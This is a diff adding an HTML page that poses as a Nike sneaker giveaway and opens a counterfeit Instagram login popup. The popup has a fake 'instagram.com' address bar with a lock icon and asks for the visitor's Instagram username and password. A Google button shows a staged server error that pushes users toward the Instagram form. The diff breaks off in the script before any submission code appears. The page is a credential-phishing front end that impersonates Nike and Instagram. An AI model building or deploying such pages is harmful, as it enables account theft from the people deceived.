@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up — Nike Exclusive Giveaway</title>
+    <link rel="icon" type="image/svg+xml" href="Nike. Just Do It. Nike IN_files/nike-logo-192x192.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        /* ===== NIKE DESIGN SYSTEM RESET ===== */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --nike-black: #111111;
+            --nike-white: #FFFFFF;
+            --nike-grey-100: #F5F5F5;
+            --nike-grey-200: #E5E5E5;
+            --nike-grey-300: #CACACB;
+            --nike-grey-500: #707072;
+            --nike-grey-700: #333333;
+            --nike-orange: #FA5400;
+            --nike-green: #128A09;
+            --nike-red: #D43F21;
+            --insta-blue: #0095F6;
+            --insta-blue-hover: #1877F2;
+            --nike-font: 'Helvetica Neue', Helvetica, Arial, 'Inter', sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+        }
+
+        body {
+            font-family: var(--nike-font);
+            color: var(--nike-black);
+            background-color: var(--nike-white);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        /* ===== SIGNUP LAYOUT ===== */
+        .signup-layout {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            min-height: 100vh;
+        }
+
+        /* ===== LEFT PANEL - VISUAL ===== */
+        .signup-visual {
+            position: relative;
+            background: var(--nike-black);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .signup-visual::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: url('Nike. Just Do It. Nike IN_files/P1C_Dweb_2610.png') center/cover no-repeat;
+            opacity: 0.4;
+            filter: brightness(0.6);
+        }
+
+        .signup-visual::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.7) 100%);
+        }
+
+        .visual-content {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            color: var(--nike-white);
+            padding: 48px;
+        }
+
+        .visual-swoosh {
+            width: 80px;
+            height: 30px;
+            margin: 0 auto 32px;
+        }
+        .visual-swoosh svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .visual-content h1 {
+            font-size: 64px;
+            font-weight: 900;
+            line-height: 1;
+            text-transform: uppercase;
+            letter-spacing: -2px;
+            margin-bottom: 16px;
+        }
+
+        .visual-content p {
+            font-size: 16px;
+            color: rgba(255,255,255,0.7);
+            max-width: 380px;
+            margin: 0 auto 40px;
+            line-height: 1.6;
+        }
+
+        /* Floating shoe images */
+        .floating-shoes {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+        }
+        .floating-shoe {
+            width: 100px;
+            height: 100px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            animation: float 3s ease-in-out infinite;
+        }
+        .floating-shoe:nth-child(2) { animation-delay: 0.5s; }
+        .floating-shoe:nth-child(3) { animation-delay: 1s; }
+        .floating-shoe img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-12px); }
+        }
+
+        /* ===== RIGHT PANEL - AUTH OPTIONS ===== */
+        .signup-form-panel {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 48px;
+            background: var(--nike-white);
+            overflow-y: auto;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .form-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+        .form-logo svg {
+            width: 48px;
+            height: 18px;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .form-header h2 {
+            font-size: 28px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+
+        .form-header p {
+            font-size: 14px;
+            color: var(--nike-grey-500);
+            line-height: 1.5;
+        }
+
+        /* ===== INFO BADGE ===== */
+        .info-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--nike-grey-100);
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 28px;
+        }
+        .info-badge .badge-icon {
+            width: 36px;
+            height: 36px;
+            background: var(--nike-black);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .info-badge .badge-icon svg {
+            width: 18px;
+            height: 18px;
+            fill: var(--nike-white);
+        }
+        .info-badge .badge-text {
+            font-size: 13px;
+            color: var(--nike-grey-700);
+            line-height: 1.4;
+        }
+        .info-badge .badge-text strong {
+            color: var(--nike-black);
+        }
+
+        /* ===== SOCIAL LOGIN OPTIONS ===== */
+        .auth-options {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .auth-btn {
+            width: 100%;
+            height: 56px;
+            border-radius: 12px;
+            border: 1.5px solid var(--nike-grey-200);
+            background: var(--nike-white);
+            color: var(--nike-black);
+            font-family: var(--nike-font);
+            font-size: 15px;
+            font-weight: 600;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .auth-btn:hover {
+            border-color: var(--nike-black);
+            background: var(--nike-grey-100);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        .auth-btn:active {
+            transform: translateY(0);
+        }
+
+        .auth-btn-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .auth-btn-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .auth-btn-domain {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--nike-grey-500);
+        }
+
+        .auth-btn.instagram-btn {
+            border-color: #dcdcdc;
+        }
+
+        .auth-btn.instagram-btn:hover {
+            border-color: #E1306C;
+            background: linear-gradient(90deg, rgba(253,29,29,0.04) 0%, rgba(131,58,180,0.04) 100%);
+        }
+
+        /* ===== DIVIDER ===== */
+        .form-divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 28px 0 20px;
+        }
+        .form-divider::before,
+        .form-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--nike-grey-200);
+        }
+        .form-divider span {
+            font-size: 12px;
+            color: var(--nike-grey-500);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+
+        /* ===== BACK LINK ===== */
+        .back-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+            color: var(--nike-grey-500);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .back-link:hover {
+            color: var(--nike-black);
+        }
+        .back-link svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* ===== MODAL BACKDROP ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(8px);
+            z-index: 9000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            animation: overlayIn 0.25s ease;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        @keyframes overlayIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes cardSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* ===== SERVER NOT RESPONDING POPUP ===== */
+        .server-error-card {
+            background: var(--nike-white);
+            border-radius: 16px;
+            padding: 40px 36px;
+            text-align: center;
+            max-width: 410px;
+            width: 100%;
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.25);
+            animation: cardSlideUp 0.3s ease both;
+        }
+
+        .server-status-icon {
+            width: 68px;
+            height: 68px;
+            border-radius: 50%;
+            background: rgba(212, 63, 33, 0.12);
+            color: var(--nike-red);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .server-status-icon.loading {
+            background: var(--nike-grey-100);
+            color: var(--nike-black);
+        }
+
+        .server-spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid var(--nike-grey-200);
+            border-top-color: var(--nike-black);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        .server-error-card h3 {
+            font-size: 22px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: -0.3px;
+            margin-bottom: 10px;
+            color: var(--nike-black);
+        }
+
+        .server-error-card p {
+            font-size: 14px;
+            color: var(--nike-grey-500);
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .server-error-code {
+            display: inline-block;
+            background: var(--nike-grey-100);
+            color: var(--nike-red);
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 6px 12px;
+            border-radius: 6px;
+            margin-bottom: 24px;
+        }
+
+        /* ===== INSTAGRAM POPUP WINDOW ===== */
+        .insta-popup-window {
+            background: var(--nike-white);
+            border-radius: 16px;
+            width: 100%;
+            max-width: 440px;
+            max-height: 92vh;
+            overflow-y: auto;
+            box-shadow: 0 28px 70px rgba(0, 0, 0, 0.35);
+            animation: cardSlideUp 0.3s ease both;
+            border: 1px solid var(--nike-grey-200);
+        }
+
+        .insta-browser-bar {
+            background: #FAFAFA;
+            border-bottom: 1px solid #DBDBDB;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .insta-url-pill {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #EFEFEF;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .insta-url-pill svg {
+            width: 12px;
+            height: 12px;
+            color: #128A09;
+        }
+
+        .modal-close-btn {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: none;
+            background: #EFEFEF;
+            color: #262626;
+            font-size: 18px;
+            line-height: 1;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+        }
+
+        .modal-close-btn:hover {
+            background: #DBDBDB;
+        }
+
+        .insta-popup-body {
+            padding: 28px 32px 32px;
+        }
+
+        .insta-brand-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .insta-logo-badge {
+            width: 52px;
+            height: 52px;
+            border-radius: 14px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            box-shadow: 0 6px 18px rgba(214, 36, 159, 0.25);
+        }
+
+        .insta-brand-header h3 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #262626;
+            letter-spacing: -0.4px;
+            margin-bottom: 4px;
+        }
+
+        .insta-brand-header p {
+            font-size: 13px;
+            color: #737373;
+        }
+
+        /* ===== FORM STYLES INSIDE POPUP ===== */
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--nike-grey-500);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            color: var(--nike-grey-300);
+            pointer-events: none;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            height: 50px;
+            border: 1.5px solid var(--nike-grey-200);
+            border-radius: 8px;
+            padding: 0 44px 0 48px;
+            font-size: 15px;
+            font-family: var(--nike-font);
+            color: var(--nike-black);
+            background: #FAFAFA;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            background: var(--nike-white);
+            border-color: var(--nike-black);
+            box-shadow: 0 0 0 1px var(--nike-black);
+        }
+
+        .input-wrapper input::placeholder {
+            color: var(--nike-grey-300);
+        }
+
+        .input-wrapper input.error {
+            border-color: var(--nike-red);
+            box-shadow: 0 0 0 1px var(--nike-red);
+        }
+
+        .input-wrapper input.success {
+            border-color: var(--nike-green);
+            box-shadow: 0 0 0 1px var(--nike-green);
+        }
+
+        .field-hint {
+            font-size: 12px;
+            color: var(--nike-grey-500);
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .field-error {
+            font-size: 12px;
+            color: var(--nike-red);
+            margin-top: 6px;
+            display: none;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .field-error.show {
+            display: flex;
+        }
+
+        /* ===== CHECKBOX ===== */
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 22px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            min-width: 20px;
+            border: 1.5px solid var(--nike-grey-300);
+            border-radius: 4px;
+            cursor: pointer;
+            position: relative;
+            margin-top: 2px;
+            transition: all 0.15s;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked {
+            background: var(--nike-black);
+            border-color: var(--nike-black);
+        }
+
+        .checkbox-group input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            top: 3px;
+            left: 6px;
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: var(--nike-grey-500);
+            line-height: 1.5;
+            cursor: pointer;
+        }
+        .checkbox-group label a {
+            color: var(--nike-black);
+            text-decoration: underline;
+        }
+
+        /* ===== SUBMIT BUTTON ===== */
+        .submit-btn {
+            width: 100%;
+            height: 52px;
+            background: var(--nike-black);
+            color: var(--nike-white);
+            font-size: 16px;
+            font-weight: 600;
+            font-family: var(--nike-font);
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn:hover {
+            background: var(--nike-grey-700);
+            transform: scale(1.01);
+        }
+
+        .submit-btn:active {
+            transform: scale(0.99);
+        }
+
+        .submit-btn:disabled {
+            background: var(--nike-grey-300);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .submit-btn .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            display: none;
+        }
+
+        .submit-btn.loading .spinner {
+            display: block;
+        }
+        .submit-btn.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== SUCCESS OVERLAY ===== */
+        .success-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.65);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: overlayIn 0.3s ease;
+        }
+
+        .success-overlay.show {
+            display: flex;
+        }
+
+        .success-card {
+            background: var(--nike-white);
+            border-radius: 16px;
+            padding: 48px;
+            text-align: center;
+            max-width: 440px;
+            width: 90%;
+            animation: cardSlideUp 0.4s ease 0.1s both;
+        }
+
+        .success-check {
+            width: 72px;
+            height: 72px;
+            background: var(--nike-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+        }
+        .success-check svg {
+            width: 36px;
+            height: 36px;
+            stroke: white;
+            stroke-width: 3;
+            fill: none;
+        }
+
+        .success-card h3 {
+            font-size: 24px;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+        }
+        .success-card h3.error-title {
+            color: var(--nike-red);
+        }
+        .success-card p {
+            font-size: 14px;
+            color: var(--nike-grey-500);
+            line-height: 1.6;
+            margin-bottom: 28px;
+        }
+
+        .success-ref {
+            background: var(--nike-grey-100);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 28px;
+        }
+        .success-ref .ref-label {
+            font-size: 11px;
+            color: var(--nike-grey-500);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+        .success-ref .ref-code {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 3px;
+            color: var(--nike-black);
+            font-family: 'Courier New', monospace;
+        }
+
+        .success-btn {
+            display: inline-block;
+            background: var(--nike-black);
+            color: var(--nike-white);
+            font-size: 14px;
+            font-weight: 600;
+            padding: 14px 36px;
+            border-radius: 30px;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            font-family: var(--nike-font);
+            transition: background 0.2s;
+        }
+        .success-btn:hover {
+            background: var(--nike-grey-700);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 900px) {
+            .signup-layout {
+                grid-template-columns: 1fr;
+            }
+            .signup-visual {
+                min-height: 280px;
+            }
+            .visual-content h1 {
+                font-size: 40px;
+            }
+            .signup-form-panel {
+                padding: 32px 24px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .visual-content h1 {
+                font-size: 32px;
+            }
+            .floating-shoes {
+                gap: 8px;
+            }
+            .floating-shoe {
+                width: 72px;
+                height: 72px;
+            }
+            .insta-popup-body {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+   
+
+    <!-- INSTAGRAM LOGIN POPUP MODAL -->
+    <div class="modal-overlay" id="instaModalOverlay" onclick="closeModalOnBackdrop(event, 'instaModalOverlay')">
+        <div class="insta-popup-window" role="dialog" aria-modal="true" aria-labelledby="instaModalHeading">
+            <div class="insta-browser-bar">
+                <div class="insta-url-pill">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                        <path d="M7 11V7a5 5 0 0110 0v4"/>
+                    </svg>
+                    <span>instagram.com</span>
+                </div>
+                <button type="button" class="modal-close-btn" aria-label="Close Instagram Login" onclick="closeInstaModal()">&times;</button>
+            </div>
+
+            <div class="insta-popup-body">
+                <div class="insta-brand-header">
+                    <div class="insta-logo-badge">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#FFFFFF" stroke-width="2">
+                            <rect x="2" y="2" width="20" height="20" rx="5"/>
+                            <circle cx="12" cy="12" r="5"/>
+                            <circle cx="17.5" cy="6.5" r="1.5" fill="#FFFFFF" stroke="none"/>
+                        </svg>
+                    </div>
+                    <h3 id="instaModalHeading">Instagram</h3>
+                    <p>Authenticate with Instagram to complete your Nike Giveaway entry</p>
+                </div>
+
+                <!-- Giveaway Auth Form inside Instagram Popup -->
+                <form id="giveawayForm" onsubmit="handleSubmit(event)">
+
+                    <!-- Instagram Username -->
+                    <div class="form-group">
+                        <label for="instagram">Instagram Username</label>
+                        <div class="input-wrapper">
+                            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                                <rect x="2" y="2" width="20" height="20" rx="5"/>
+                                <circle cx="12" cy="12" r="5"/>
+                                <circle cx="17.5" cy="6.5" r="1.5" fill="currentColor" stroke="none"/>
+                            </svg>
+                            <input type="text" id="instagram" name="instagram" placeholder="@yourusername" autocomplete="off" required>
+                        </div>
+                        <div class="field-hint">We use instagram to authenticate</div>
+                        <div class="field-error" id="instagramError">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-2h2v2h-2zm0-4V7h2v6h-2z"/></svg>
+                            Please enter a valid Instagram username
+                        </div>
+                    </div>
+
+                    <!-- Password -->
+                    <div class="form-group">
+                        <label for="accessKey">Password</label>
+                        <div class="input-wrapper">
+                            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                                <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 11-7.778 7.778 5.5 5.5 0 017.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/>
+                            </svg>
+                            <input type="password" id="accessKey" name="accessKey" placeholder="Enter your password" autocomplete="off" required>
+                            <button type="button" id="togglePassword"
+                                    aria-label="Show password"
+                                    style="position:absolute; right:12px; background:none; border:none; cursor:pointer; color:inherit; display:flex; align-items:center;">
+                                <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                                    <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/>
+                                    <circle cx="12" cy="12" r="3"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="field-hint">We use safe and authenticated servers</div>
+                        <div class="field-error" id="keyError">
+                            Password is required
+                        </div>
+                    </div>
+
+                    <!-- Invite Code -->
+                    <div class="form-group">
+                        <label for="inviteCode">Invite Code</label>
+                        <div class="input-wrapper">
+                            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                                <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/>
+                                <circle cx="9" cy="7" r="4"/>
+                                <path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/>
+                            </svg>
+                            <input type="text" id="inviteCode" name="inviteCode" placeholder="e.g. NIKE-2026-XXXX" autocomplete="off" required>
+                        </div>
+                        <div class="field-hint">Enter the invite code you received</div>
+                        <div class="field-error" id="inviteError">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-2h2v2h-2zm0-4V7h2v6h-2z"/></svg>
+                            Invalid invite code format
+                        </div>
+                    </div>
+
+                    <!-- Terms checkbox -->
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="terms">
+                        <label for="terms">I agree to Nike's <a href="https://www.nike.in/cp/terms-conditions">Terms of Use</a> and <a href="https://www.nike.in/cp/privacy-policy">Privacy Policy</a>, and consent to be contacted via Instagram for giveaway updates.</label>
+                    </div>
+
+                    <!-- Submit -->
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <span class="btn-text">Submit Entry</span>
+                        <div class="spinner"></div>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- SUCCESS / RESULT OVERLAY -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-card">
+            <div class="success-check" id="checkIcon">
+                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <h3 id="overlayTitle">You're In! 🎉</h3>
+            <p id="overlayMsg">Your entry has been registered.</p>
+            <div class="success-ref" id="refSection">
+                <div class="ref-label">Your Referral Code</div>
+                <div class="ref-code" id="refCode">NIKE-XXXX</div>
+            </div>
+            <a href="signup.html" class="success-btn">Back to Giveaway</a>
+        </div>
+    </div>
+
+    <!-- SIGNUP LAYOUT -->
+    <div class="signup-layout">
+
+        <!-- LEFT - VISUAL -->
+        <div class="signup-visual">
+            <div class="visual-content">
+                <div class="visual-swoosh">
+                    <svg viewBox="0 0 192 192" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M168 69.7505L62.6877 114.422C53.9197 118.142 46.5437 119.998 40.5997 119.998C33.9117 119.998 29.0397 117.638 26.0477 112.926C22.1677 106.854 23.8637 97.0705 30.5197 86.7505C34.4717 80.7185 39.4957 75.1825 44.3917 69.8865C43.2397 71.7585 33.0717 88.6785 44.1917 96.6465C46.3917 98.2465 49.5197 99.0305 53.3677 99.0305C56.4557 99.0305 59.9997 98.5265 63.8957 97.5105L168 69.7505Z" fill="#FFFFFF"/>
+                    </svg>
+                </div>
+                <h1>Claim Your<br>Kicks</h1>
+                <p>Enter the Nike Exclusive Giveaway for a chance to win premium sneakers. Limited entries available.</p>
+                <div class="floating-shoes">
+                    <div class="floating-shoe">
+                        <img src="Nike. Just Do It. Nike IN_files/094e755Nike-IQ0467-001_1.jpg" alt="Nike Shoe 1">
+                    </div>
+                    <div class="floating-shoe">
+                        <img src="Nike. Just Do It. Nike IN_files/094e755Nike-HQ7002-005_1.jpg" alt="Nike Shoe 2">
+                    </div>
+                    <div class="floating-shoe">
+                        <img src="Nike. Just Do It. Nike IN_files/ad22b92Nike-IM3486-002_1.jpg" alt="Nike Shoe 3">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RIGHT - AUTH OPTIONS PANEL -->
+        <div class="signup-form-panel">
+            <div class="form-container">
+
+                <!-- Logo -->
+                <div class="form-logo">
+                    <svg viewBox="0 0 192 192" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path fill-rule="evenodd" clip-rule="evenodd" d="M168 69.7505L62.6877 114.422C53.9197 118.142 46.5437 119.998 40.5997 119.998C33.9117 119.998 29.0397 117.638 26.0477 112.926C22.1677 106.854 23.8637 97.0705 30.5197 86.7505C34.4717 80.7185 39.4957 75.1825 44.3917 69.8865C43.2397 71.7585 33.0717 88.6785 44.1917 96.6465C46.3917 98.2465 49.5197 99.0305 53.3677 99.0305C56.4557 99.0305 59.9997 98.5265 63.8957 97.5105L168 69.7505Z" fill="#111111"/>
+                    </svg>
+                </div>
+
+                <!-- Header -->
+                <div class="form-header">
+                    <h2>Enter the Giveaway</h2>
+                    <p>Select an authentication method below to verify your account and register your entry.</p>
+                </div>
+
+                <!-- Info badge -->
+                <div class="info-badge">
+                    <div class="badge-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-11v6h2v-6h-2zm0-4v2h2V7h-2z"/></svg>
+                    </div>
+                    <div class="badge-text">
+                        <strong>Limited entries.</strong> Only valid invite codes and authenticated accounts will be accepted.
+                    </div>
+                </div>
+
+                <!-- Authentication Provider Options -->
+                <div class="auth-options">
+
+                    <!-- Google Option -->
+                    <button type="button" class="auth-btn" onclick="openServerErrorModal('Google')">
+                        <span class="auth-btn-left">
+                            <span class="auth-btn-icon">
+                                <svg width="20" height="20" viewBox="0 0 48 48">
+                                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                                </svg>
+                            </span>
+                            <span>Continue with Google</span>
+                        </span>
+                        <span class="auth-btn-domain">google.com</span>
+                    </button>
+
+                  
+
+                    <!-- Instagram Option -->
+                    <button type="button" class="auth-btn instagram-btn" onclick="openInstaModal()">
+                        <span class="auth-btn-left">
+                            <span class="auth-btn-icon">
+                                <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+                                    <defs>
+                                        <linearGradient id="instaGrad" x1="2" y1="22" x2="22" y2="2" gradientUnits="userSpaceOnUse">
+                                            <stop offset="0%" stop-color="#FD5949"/>
+                                            <stop offset="50%" stop-color="#D6249F"/>
+                                            <stop offset="100%" stop-color="#285AEB"/>
+                                        </linearGradient>
+                                    </defs>
+                                    <rect x="2" y="2" width="20" height="20" rx="5" stroke="url(#instaGrad)" stroke-width="2"/>
+                                    <circle cx="12" cy="12" r="4.5" stroke="url(#instaGrad)" stroke-width="2"/>
+                                    <circle cx="17.5" cy="6.5" r="1.3" fill="url(#instaGrad)"/>
+                                </svg>
+                            </span>
+                            <span>Continue with Instagram</span>
+                        </span>
+                        <span class="auth-btn-domain">instagram.com</span>
+                    </button>
+
+                </div>
+
+                <div class="form-divider"><span>or</span></div>
+
+                <a href="index.html" class="back-link">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                    Back to Giveaway Page
+                </a>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let serverTimeoutTimer = null;
+
+        // ===== GOOGLE / FACEBOOK SERVER NOT RESPONDING POPUP =====
+        function openServerErrorModal(provider) {
+            const overlay = document.getElementById('serverErrorOverlay');
+            const statusIcon = document.getElementById('serverStatusIcon');
+            const title = document.getElementById('serverErrorTitle');
+            const msg = document.getElementById('serverErrorMsg');
